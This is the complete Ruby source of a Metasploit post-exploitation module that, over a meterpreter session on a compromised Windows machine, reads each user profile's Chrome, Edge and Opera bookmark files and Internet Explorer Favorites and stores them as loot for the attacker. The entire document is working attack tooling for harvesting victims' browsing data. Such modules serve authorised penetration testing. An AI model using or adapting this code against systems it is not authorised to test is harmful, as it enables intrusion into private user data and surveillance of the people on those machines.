class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Bookmarked Sites Retriever',
        'Description' => %q{
          This module discovers information about a target by retrieving their bookmarked websites on Google Chrome, Opera and Microsoft Edge.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'jerrelgordon'],
        'Platform' => [ 'win' ],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [ ],
          'SideEffects' => []
        }
      )
 )
  end

  def run
    get_bookmarks('GoogleChrome') # gets bookmarks for google chrome
    get_bookmarks('Opera') # gets bookmarks for opera
    get_bookmarks('Edge') # gets bookmarks for edge
    get_bookmarks('IE') # gets bookmarks for internet explorer
  end

  def get_bookmarks(browser)
    file_exists = false # initializes file as not found
    grab_user_profiles.each do |user| # parses information for all users on target machine into a list.
      # If the browser is Google Chrome or Edge is searches the "AppData\Local directory, if it is Opera, it searches the AppData\Roaming directory"
      if (browser == 'GoogleChrome')
        next unless user['LocalAppData']

        bookmark_path = "#{user['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Bookmarks" # sets path for Google Chrome Bookmarks
      elsif (browser == 'Edge')
        next unless user['LocalAppData']

        bookmark_path = "#{user['LocalAppData']}\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" # sets path for Microsoft Edge Bookmarks
      elsif (browser == 'Opera')
        next unless user['AppData']

        bookmark_path = "#{user['AppData']}\\Opera Software\\Opera Stable\\Bookmarks" # sets path for Opera Bookmarks
      elsif (browser == 'IE')
        next unless user['Favorites']

        bookmark_path = (user['Favorites']).to_s # sets path for IE Bookmarks Folder
        count = 1
        dir(bookmark_path).each do |file| # IE bookmarks stored individually as files so loots each one
          next if ['.', '..'].include?(file)

          file_exists = true
          print_status("BOOKMARKS FOR #{user['ProfileDir']}")
          path2 = "#{bookmark_path}\\#{file}"
          file_contents = read_file(path2)
          stored_bookmarks = store_loot(
            "#{browser}.bookmarks",
            'text/plain',
            session,
            file_contents,
            "#{session}_#{count}_#{browser}_bookmarks.txt",
            "Bookmarks for #{browser}"
          )
          print_status("Bookmarks stored: #{stored_bookmarks}")
          count += 1
        end
      end

      next unless file?(bookmark_path) # if file exists it is set to found, then all the bookmarks are outputted to standard output (the shell)

      file_exists = true
      print_status("BOOKMARKS FOR #{user['ProfileDir']}")
      file = read_file(bookmark_path)
      stored_bookmarks = store_loot(
        "#{browser}.bookmarks",
        'text/plain',
        session,
        file,
        "#{session}_#{browser}_bookmarks.txt",
        "Bookmarks for #{browser}"
      )
      print_status("Bookmarks stored: #{stored_bookmarks}")
    end
    if (file_exists == false) # if file was not found, prints no file found.
      print_status("No Bookmarks found for #{browser}")
    end
  end
end
